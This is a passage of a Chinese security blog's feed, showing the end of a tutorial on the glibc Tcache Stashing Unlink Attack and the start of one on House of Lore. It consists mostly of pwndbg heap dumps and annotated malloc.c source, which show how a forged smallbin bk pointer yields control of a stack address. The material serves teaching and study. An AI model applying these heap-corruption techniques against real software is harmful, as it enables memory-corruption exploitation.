<span class="comment">#chunk2（free-tcachebin）</span></span><br><span class="line"><span class="number">0</span>x602300:<span class="number">0</span>x0000000000602760<span class="number">0</span>x0000000000602010</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602390:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk3（free-smallbin）</span></span><br><span class="line"><span class="number">0</span>x6023a0:<span class="number">0</span>x0000000000602250<span class="number">0</span>x00007ffff7dcdd30</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602430:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk4(free-tcachebin)</span></span><br><span class="line"><span class="number">0</span>x602440:<span class="number">0</span>x0000000000000000<span class="number">0</span>x0000000000602010</span><br><span class="line"><span class="comment">#tcache_key</span></span><br><span class="line">                              <span class="comment">#防止tcache double free（可以绕过）</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x6024d0:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk5(free-tcachebin)</span></span><br><span class="line"><span class="number">0</span>x6024e0:<span class="number">0</span>x0000000000602440<span class="number">0</span>x0000000000602010</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602570:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk6(free-tcachebin)</span></span><br><span class="line"><span class="number">0</span>x602580:<span class="number">0</span>x00000000006024e0<span class="number">0</span>x0000000000602010</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602610:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk7(free-tcachebin)</span></span><br><span class="line"><span class="number">0</span>x602620:<span class="number">0</span>x0000000000602580<span class="number">0</span>x0000000000602010</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x6026b0:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk8(free-tcachebin)</span></span><br><span class="line"><span class="number">0</span>x6026c0:<span class="number">0</span>x0000000000602620<span class="number">0</span>x0000000000602010</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602750:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk9(free-tcachebin)</span></span><br><span class="line"><span class="number">0</span>x602760:<span class="number">0</span>x00000000006026c0<span class="number">0</span>x0000000000602010</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x6027f0:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000b1 <span class="comment">#malloc</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x6028a0:<span class="number">0</span>x0000000000000000<span class="number">0</span>x0000000000020761 <span class="comment">#top_chunk</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602950:<span class="number">0</span>x0000000000000000<span class="number">0</span>x0000000000000000</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>因为 Tcache Stashing Unlink Attack 要求 tcachebin 未满，因此这里申请两个 chunk（b 37）：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">300</span>gx <span class="number">0</span>x602000</span><br><span class="line"><span class="number">0</span>x602000:<span class="number">0</span>x0000000000000000<span class="number">0</span>x0000000000000251 <span class="comment">#tcache_perthread_struct</span></span><br><span class="line"><span class="number">0</span>x602010:<span class="number">0</span>x0000000000000000<span class="number">0</span>x0000000000000005</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602090:<span class="number">0</span>x00000000006026c0<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="comment">#指向最后一个tcache free chunk</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602250:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk1（free-smallbin）</span></span><br><span class="line"><span class="number">0</span>x602260:<span class="number">0</span>x00007ffff7dcdd30<span class="number">0</span>x0000000000602390</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x6022f0:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk2（malloc）</span></span><br><span class="line"><span class="number">0</span>x602300:<span class="number">0</span>x0000000000602760<span class="number">0</span>x0000000000000000</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602390:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk3（free-smallbin）</span></span><br><span class="line"><span class="number">0</span>x6023a0:<span class="number">0</span>x0000000000602250<span class="number">0</span>x00007ffff7dcdd30</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602430:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk4(free-tcachebin)</span></span><br><span class="line"><span class="number">0</span>x602440:<span class="number">0</span>x0000000000000000<span class="number">0</span>x0000000000602010</span><br><span class="line"><span class="comment">#tcache_key</span></span><br><span class="line">                              <span class="comment">#防止tcache double free（可以绕过）</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x6024d0:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk5(free-tcachebin)</span></span><br><span class="line"><span class="number">0</span>x6024e0:<span class="number">0</span>x0000000000602440<span class="number">0</span>x0000000000602010</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602570:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk6(free-tcachebin)</span></span><br><span class="line"><span class="number">0</span>x602580:<span class="number">0</span>x00000000006024e0<span class="number">0</span>x0000000000602010</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602610:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk7(free-tcachebin)</span></span><br><span class="line"><span class="number">0</span>x602620:<span class="number">0</span>x0000000000602580<span class="number">0</span>x0000000000602010</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x6026b0:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk8(free-tcachebin)</span></span><br><span class="line"><span class="number">0</span>x6026c0:<span class="number">0</span>x0000000000602620<span class="number">0</span>x0000000000602010</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602750:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk9(malloc)</span></span><br><span class="line"><span class="number">0</span>x602760:<span class="number">0</span>x00000000006026c0<span class="number">000000000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x6027f0:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000b1 <span class="comment">#chunk10(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x6028a0:<span class="number">0</span>x0000000000000000<span class="number">0</span>x0000000000020761 <span class="comment">#top_chunk</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602950:<span class="number">0</span>x0000000000000000<span class="number">0</span>x0000000000000000</span><br><span class="line">pwndbg&gt; bin</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0</span>xa0 [  <span class="number">5</span>]: <span class="number">0</span>x6026c0 —▸ <span class="number">0</span>x602620 —▸ <span class="number">0</span>x602580 —▸ <span class="number">0</span>x6024e0 —▸ <span class="number">0</span>x602440 ◂— <span class="number">0</span>x0</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0</span>x20: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span>x30: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span>x40: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span>x50: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span>x60: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span>x70: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span>x80: <span class="number">0</span>x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0</span>x0</span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0</span>xa0: <span class="number">0</span>x602390 —▸ <span class="number">0</span>x602250 —▸ <span class="number">0</span>x7ffff7dcdd30 (main_arena+<span class="number">240</span>) ◂— nop     /* <span class="number">0</span>x602390 */</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>模拟 UAF 漏洞修改 bk 为 fake_chunk(b 39)：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">5</span>]: <span class="number">0x6026c0</span> —▸ <span class="number">0x602620</span> —▸ <span class="number">0x602580</span> —▸ <span class="number">0x6024e0</span> —▸ <span class="number">0x602440</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0xa0</span> [corrupted]</span><br><span class="line">FD: <span class="number">0x602390</span> —▸ <span class="number">0x602250</span> —▸ <span class="number">0x7ffff7dcdd30</span> (main_arena+<span class="number">240</span>) ◂— nop     <span class="comment">/* 0x602390 */</span></span><br><span class="line">BK: <span class="number">0x602250</span> —▸ <span class="number">0x602390</span> —▸ <span class="number">0x7fffffffdd10</span> —▸ <span class="number">0x7fffffffdd20</span> ◂— <span class="number">0x0</span></span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/<span class="number">16</span>gx <span class="number">0x602390</span></span><br><span class="line"><span class="number">0x602390</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk3（<span class="built_in">free</span>-smallbin）</span><br><span class="line"><span class="number">0x6023a0</span>:<span class="number">0x0000000000602250</span><span class="number">0x00007fffffffdd10</span></span><br><span class="line"><span class="number">0x6023b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6023c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6023d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6023e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6023f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602400</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>由于 smallbin 是按照 bk 指针寻块的，分配的顺序应当是：0x602250 —▸ 0x602390 —▸ 0x7fffffffdd10（FIFO）,<br>调用 calloc 之后再查看堆布局（b 42）：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0</span>xa0 [  <span class="number">7</span>]: <span class="number">0</span>x7fffffffdd20 —▸ <span class="number">0</span>x6023a0 —▸ <span class="number">0</span>x6026c0 —▸ <span class="number">0</span>x602620 —▸ <span class="number">0</span>x602580 —▸ <span class="number">0</span>x6024e0 —▸ <span class="number">0</span>x602440 ◂— <span class="number">0</span>x0</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0</span>x20: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span>x30: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span>x40: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span>x50: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span>x60: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span>x70: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span>x80: <span class="number">0</span>x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0</span>x0</span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0</span>xa0 [<span class="type">corrupted</span>]</span><br><span class="line">FD: <span class="number">0</span>x602390 —▸ <span class="number">0</span>x6026c0 ◂— <span class="number">0</span>x0</span><br><span class="line">BK: <span class="number">0</span>x7fffffffdd20 ◂— <span class="number">0</span>x0</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; p pp</span><br><span class="line"><span class="variable">$1</span> = (unsigned long *) <span class="number">0</span>x602260</span><br><span class="line">pwndbg&gt; x/<span class="number">16</span>gx stack_var</span><br><span class="line"><span class="number">0</span>x7fffffffdd10:<span class="number">0</span>x0000000000000000<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x7fffffffdd20:<span class="number">0</span>x00000000006023a0<span class="number">0</span>x0000000000602010</span><br><span class="line"><span class="number">0</span>x7fffffffdd30:<span class="number">0</span>x00007ffff7dcdd30<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="comment">#libc-main_arena</span></span><br><span class="line"><span class="number">0</span>x7fffffffdd40:<span class="number">0</span>x0000000000000000<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x7fffffffdd50:<span class="number">0</span>x0000000000000000<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x7fffffffdd60:<span class="number">0</span>x0000000000000000<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x7fffffffdd70:<span class="number">0</span>x0000000000000000<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x7fffffffdd80:<span class="number">0</span>x0000000000000000<span class="number">0</span>x0000000000000000</span><br><span class="line">pwndbg&gt; x/<span class="number">16</span>gx <span class="number">0</span>x00007ffff7dcdd30</span><br><span class="line"><span class="number">0</span>x7ffff7dcdd30 &lt;main_arena+<span class="number">240</span>&gt;:<span class="number">0</span>x00007ffff7dcdd20<span class="number">0</span>x00007ffff7dcdd20</span><br><span class="line"><span class="number">0</span>x7ffff7dcdd40 &lt;main_arena+<span class="number">256</span>&gt;:<span class="number">0</span>x0000000000602390<span class="number">0</span>x00007fffffffdd20</span><br><span class="line"><span class="number">0</span>x7ffff7dcdd50 &lt;main_arena+<span class="number">272</span>&gt;:<span class="number">0</span>x00007ffff7dcdd40<span class="number">0</span>x00007ffff7dcdd40</span><br><span class="line"><span class="number">0</span>x7ffff7dcdd60 &lt;main_arena+<span class="number">288</span>&gt;:<span class="number">0</span>x00007ffff7dcdd50<span class="number">0</span>x00007ffff7dcdd50</span><br><span class="line"><span class="number">0</span>x7ffff7dcdd70 &lt;main_arena+<span class="number">304</span>&gt;:<span class="number">0</span>x00007ffff7dcdd60<span class="number">0</span>x00007ffff7dcdd60</span><br><span class="line"><span class="number">0</span>x7ffff7dcdd80 &lt;main_arena+<span class="number">320</span>&gt;:<span class="number">0</span>x00007ffff7dcdd70<span class="number">0</span>x00007ffff7dcdd70</span><br><span class="line"><span class="number">0</span>x7ffff7dcdd90 &lt;main_arena+<span class="number">336</span>&gt;:<span class="number">0</span>x00007ffff7dcdd80<span class="number">0</span>x00007ffff7dcdd80</span><br><span class="line"><span class="number">0</span>x7ffff7dcdda0 &lt;main_arena+<span class="number">352</span>&gt;:<span class="number">0</span>x00007ffff7dcdd90<span class="number">0</span>x00007ffff7dcdd90</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>calloc 之后 fake_chunk 已经被链入 tcachebin，且因为分配顺序变成了 LIFO , 0x7fffffffdd20-0x10 这个块被提到了链表头，下次 malloc(0x90) 即可获得这个块。同时要注意，在 smallbin unlink 的过程中，由于 bck-&gt;fd=bin 的赋值操作使得 0x7fffffffdd20+0x10 处<strong>写入了一个 libc 地址</strong>。<br>再次 malloc 就会控制栈上的地址：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p target</span><br><span class="line">$<span class="number">2</span> = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *) <span class="number">0x7fffffffdd20</span></span><br><span class="line">pwndbg&gt; x/<span class="number">16</span>gx stack_var</span><br><span class="line"><span class="number">0x7fffffffdd10</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span> <span class="meta">#malloc</span></span><br><span class="line"><span class="number">0x7fffffffdd20</span>:<span class="number">0x00000000006023a0</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd30</span>:<span class="number">0x00007ffff7dcdd30</span><span class="number">0x0000000000000000</span></span><br><span class="line">    #main_arena</span><br><span class="line"><span class="number">0x7fffffffdd40</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd50</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd60</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd70</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd80</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Tcache Stashing Unlink Attack 修改 bk 为 target_addr，malloc 后会控制 target_addr-0x10，会在 target_addr+0x10 处写入 main_arena_addr</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>PWN进阶（1-7-2）-smallbin_attack-House of Lore</title>
    <link href="https://cyberangel.cn/2021/02/24/PWN%E8%BF%9B%E9%98%B6%EF%BC%881-7-2%EF%BC%89-smallbin_attack-House%20of%20Lore/"/>
    <id>https://cyberangel.cn/2021/02/24/PWN%E8%BF%9B%E9%98%B6%EF%BC%881-7-2%EF%BC%89-smallbin_attack-House%20of%20Lore/</id>
    <published>2021-02-24T01:01:24.000Z</published>
    <updated>2021-07-04T09:57:12.969Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>附件：<br>链接: <a href="https://pan.baidu.com/s/1FhFeWLk5uEmXLhvpu4wkQQ">https://pan.baidu.com/s/1FhFeWLk5uEmXLhvpu4wkQQ</a>   密码: 30ia<br>–来自百度网盘超级会员 V3 的分享</p></blockquote><h1 id="攻击前提"><a href="#攻击前提" class="headerlink" title="攻击前提"></a>攻击前提</h1><blockquote><p>house of lore 存在于&lt;glibc 2.31 版本</p></blockquote><h1 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1614162239705-83c1ef54-675c-4345-94c0-a0c1363a03ee.png#align=left&display=inline&height=1130&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-02-24%2018.23.55.png&originHeight=1130&originWidth=2002&size=124148&status=done&style=none&width=2002" alt="截屏2021-02-24 18.23.55.png"></h1><p>当处于上图情况时并且可以修改 smallbin 中的 bk 指针指向目标地址，malloc<strong>两次</strong>与 victim**大小****相同**的 chunk 即可控制该地址。</p><h1 id="讲解"><a href="#讲解" class="headerlink" title="讲解"></a>讲解</h1><p>在上一小节中我们提到了 fastbin 的内存整理，其机制与 malloc_consolidate 紧密相关，这一小节来看 House of Lore，再来贴一下 glibc-2.23 环境中 malloc 时 smallbin 的执行流程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#malloc.c中第3405-3434行</span></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb)) <span class="comment">//nb为所申请的chunk的真实大小。</span></span><br><span class="line">    &#123;<span class="comment">//若申请的chunk大小在smallbin中</span></span><br><span class="line">      idx = smallbin_index (nb);<span class="comment">//获取smallbin的索引</span></span><br><span class="line">      bin = bin_at (av, idx); <span class="comment">//获取smallbin中的chunk指针</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;<span class="comment">// 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk</span></span><br><span class="line">         <span class="comment">// 如果 victim = bin ，那说明该 bin 为空。</span></span><br><span class="line">         <span class="comment">// 如果不相等，那么会有两种情况</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span> <span class="comment">//第一种情况，smallbin还没有初始化。</span></span><br><span class="line"></span><br><span class="line">              malloc_consolidate (av);  <span class="comment">//执行初始化，fastbin中的chunk进行合并</span></span><br><span class="line">          <span class="keyword">else</span> <span class="comment">//第二种情况，smallbin中存在空闲的 chunk</span></span><br><span class="line">            &#123;</span><br><span class="line">              bck = victim-&gt;bk; <span class="comment">//获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line">                &#123;</span><br><span class="line">                  errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">              set_inuse_bit_at_offset (victim, nb); <span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">              bin-&gt;bk = bck; <span class="comment">//修改 smallbin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)<span class="comment">// 如果不是 main_arena，设置对应的标志</span></span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);<span class="comment">// 细致的检查</span></span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);<span class="comment">// 将申请到的 chunk 转化为对应的 mem 状态</span></span><br><span class="line">              alloc_perturb (p, bytes);<span class="comment">// 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="comment">//若申请的大小不在smallbin中</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb); <span class="comment">//获取largebin中的索引</span></span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks (av)) <span class="comment">//判断是否有fastbin chunk</span></span><br><span class="line">        malloc_consolidate (av);  <span class="comment">//整理fastbin</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>看一下针对 smallbin 的操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">           bck = victim-&gt;bk; <span class="comment">//获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line">               &#123;</span><br><span class="line">                 errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                 <span class="keyword">goto</span> errout;</span><br><span class="line">               &#125;</span><br><span class="line">             set_inuse_bit_at_offset (victim, nb); <span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">             bin-&gt;bk = bck; <span class="comment">//修改 smallbin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">             bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure><p>要执行到这一步需要满足两个条件：</p><ul><li>所申请的 chunk 大小要在 smallbin 的范围内</li><li>smallbin 中存在空闲的 chunk</li></ul><p>为了方便说明这个过程，我们直接来看一下 house of lore 的一个例子：</p><blockquote><p>源代码由@yichen 师傅翻译：<a href="https://www.yuque.com/hxfqg9/bin/prkw8a">https://www.yuque.com/hxfqg9/bin/prkw8a</a></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 